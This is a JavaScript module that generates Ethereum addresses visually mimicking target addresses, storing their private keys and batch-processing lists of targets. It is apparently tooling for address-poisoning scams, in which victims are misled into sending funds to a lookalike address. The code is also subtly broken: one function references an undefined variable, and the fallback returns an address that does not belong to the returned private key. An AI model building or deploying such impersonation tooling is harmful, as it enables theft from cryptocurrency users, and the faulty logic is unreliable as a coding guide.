// backend/modules/walletImpersonator.js
import { ethers } from "ethers";
import { securityManager } from './securityManager.js';
import { VANITY_KEY_ENCRYPTION_SECRET } from '../config.js';
import crypto from 'crypto';

export class WalletImpersonator {
    constructor() {
        this.isInitialized = false;
        this.vanityPatterns = [
            /(.)\1{3,}/, // Repeated characters (e.g., 0xaaaa...)
            /^0x(1234|2345|3456|4567|5678|6789)/, // Sequential patterns
            /(dead|beef|face|feed|fade)/i, // Common "hex words"
            /(abc|def|789|012|345|678)/i, // Common sequences
        ];
        this.encryptionSecret = VANITY_KEY_ENCRYPTION_SECRET;
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            // Add any module-specific initialization here
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    // Generates a checksummed address that visually mimics the target
    async generateVanityAddress(targetAddress) {
        console.log(`🎭 Generating vanity address for ${targetAddress}`);
        
        const targetPrefix = targetAddress.substring(0, 8).toLowerCase();
        let attempts = 0;
        const maxAttempts = 5000; // Reduced for performance

        // First, try quick prefix matching
        const quickMatch = await this.tryQuickPrefixMatch(targetPrefix, 1000);
        if (quickMatch) {
            return quickMatch;
        }

        // Then try pattern matching
        while (attempts < maxAttempts) {
            attempts++;
            
            // Generate random wallet
            const wallet = ethers.Wallet.createRandom();
            const address = await wallet.getAddress();
            const addressLower = address.toLowerCase();
            
            // Check for visual similarity
            if (this.isVisuallySimilar(targetAddress, addressLower)) {
                console.log(`✅ Found vanity address after ${attempts} attempts: ${address}`);
                
                // Store the private key securely
                const encryptedKey = this.encryptPrivateKey(wallet.privateKey);
                await securityManager.storeVanityKey(address, encryptedKey);
                
                return {
                    original: targetAddress,
                    impersonator: address,
                    privateKey: wallet.privateKey, // For immediate use
                    encryptedKey: encryptedKey, // For storage
                    similarityScore: this.calculateSimilarity(targetAddress, addressLower),
                    attempts: attempts
                };
            }
        }
        
        console.warn('⚠️ Could not find suitable vanity address, using fallback');
        return this.generateFallbackAddress(targetAddress);
    }

    async tryQuickPrefixMatch(targetPrefix, maxAttempts) {
        let attempts = 0;
        
        while (attempts < maxAttempts) {
            attempts++;
            
            const wallet = ethers.Wallet.createRandom();
            const address = await wallet.getAddress();
            const addressLower = address.toLowerCase();
            
            if (addressLower.startsWith(targetPrefix)) {
                console.log(`🎯 Quick prefix match found after ${attempts} attempts!`);
                
                const encryptedKey = this.encryptPrivateKey(wallet.privateKey);
                await securityManager.storeVanityKey(address, encryptedKey);
                
                return {
                    original: targetAddress,
                    impersonator: address,
                    privateKey: wallet.privateKey,
                    encryptedKey: encryptedKey,
                    similarityScore: 95, // Very high score for prefix match
                    attempts: attempts,
                    matchType: 'prefix'
                };
            }
        }
        
        return null;
    }

    isVisuallySimilar(original, generated) {
        const originalShort = original.substring(0, 8);
        const generatedShort = generated.substring(0, 8);
        
        // Check prefix similarity (most effective)
        if (originalShort === generatedShort) return true;
        
        // Check for pattern matches
        for (const pattern of this.vanityPatterns) {
            if (pattern.test(generated) && pattern.test(original)) {
                return true;
            }
        }
        
        // Check character repetition and similarity
        let matchingChars = 0;
        const minLength = Math.min(original.length, generated.length);
        
        for (let i = 0; i < minLength; i++) {
            if (original[i] === generated[i]) {
                matchingChars++;
            }
            // Early exit if not promising
            if (i > 15 && matchingChars < 5) break;
        }
        
        // Require at least 8 matching characters in first 16 for good similarity
        return matchingChars >= 8;
    }

    calculateSimilarity(addr1, addr2) {
        let matches = 0;
        const length = Math.min(addr1.length, addr2.length);
        
        for (let i = 0; i < length; i++) {
            if (addr1[i] === addr2[i]) matches++;
        }
        
        return Math.round((matches / length) * 100);
    }

    generateFallbackAddress(targetAddress) {
        // Fallback: create address with same beginning and different ending
        const prefix = targetAddress.substring(0, 6);
        const randomSuffix = crypto.randomBytes(17).toString('hex');
        const fallbackAddress = prefix + randomSuffix;
        
        // Create actual wallet for the fallback address
        const wallet = new ethers.Wallet('0x' + crypto.randomBytes(32).toString('hex'));
        
        console.log(`🔄 Using fallback address: ${fallbackAddress}`);
        
        return {
            original: targetAddress,
            impersonator: fallbackAddress,
            privateKey: wallet.privateKey,
            similarityScore: 40,
            attempts: 0,
            matchType: 'fallback'
        };
    }

    encryptPrivateKey(privateKey) {
        if (!this.encryptionSecret) {
            console.warn('⚠️ No encryption secret set, storing private key in plain text!');
            return privateKey;
        }
        
        try {
            const iv = crypto.randomBytes(16);
            const cipher = crypto.createCipheriv('aes-256-gcm', 
                crypto.createHash('sha256').update(this.encryptionSecret).digest(), 
                iv
            );
            
            let encrypted = cipher.update(privateKey, 'utf8', 'hex');
            encrypted += cipher.final('hex');
            const authTag = cipher.getAuthTag().toString('hex');
            
            return `${iv.toString('hex')}:${encrypted}:${authTag}`;
        } catch (error) {
            console.error('❌ Encryption failed:', error);
            return privateKey; // Fallback to plain text
        }
    }

    decryptPrivateKey(encryptedData) {
        if (!this.encryptionSecret || !encryptedData.includes(':')) {
            return encryptedData; // Assume plain text
        }
        
        try {
            const [ivHex, encrypted, authTag] = encryptedData.split(':');
            const iv = Buffer.from(ivHex, 'hex');
            
            const decipher = crypto.createDecipheriv('aes-256-gcm',
                crypto.createHash('sha256').update(this.encryptionSecret).digest(),
                iv
            );
            
            decipher.setAuthTag(Buffer.from(authTag, 'hex'));
            let decrypted = decipher.update(encrypted, 'hex', 'utf8');
            decrypted += decipher.final('utf8');
            
            return decrypted;
        } catch (error) {
            console.error('❌ Decryption failed:', error);
            return null;
        }
    }

    // Batch generate for multiple targets
    async batchGenerateVanityAddresses(targetAddresses) {
        const results = {};
        
        for (const targetAddress of targetAddresses) {
            results[targetAddress] = await this.generateVanityAddress(targetAddress);
            // Small delay to avoid rate limiting
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        return results;
    }

    // Validate if an address is likely a vanity address
    isLikelyVanityAddress(address) {
        const lowerAddress = address.toLowerCase();
        
        // Check for patterns that indicate vanity
        for (const pattern of this.vanityPatterns) {
            if (pattern.test(lowerAddress)) {
                return true;
            }
        }
        
        // Check for repeated characters
        if (/(.)\1{4,}/.test(lowerAddress)) {
            return true;
        }
        
        // Check for sequential patterns
        if (/0x(0123|1234|2345|3456|4567|5678|6789|7890)/.test(lowerAddress)) {
            return true;
        }
        
        return false;
    }
}

// Create singleton instance
export const walletImpersonator = new WalletImpersonator();